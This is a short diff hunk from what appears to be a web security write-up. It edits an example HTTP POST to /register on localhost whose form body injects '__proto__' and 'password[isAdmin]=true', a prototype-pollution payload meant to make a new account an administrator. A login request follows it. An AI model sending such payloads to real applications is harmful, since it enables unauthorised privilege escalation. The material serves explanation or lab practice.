@@ -39,7 +39,7 @@ POST /register HTTP/1.1
 Host: localhost:3000
 Content-Type: application/x-www-form-urlencoded
 
-username[]=_ _proto_ _&password[isAdmin]=true&password[password]=1
+username[]= _ _ proto _ _ &password[isAdmin]=true&password[password]=1
 
 POST /login HTTP/1.1
 Host: localhost:3000
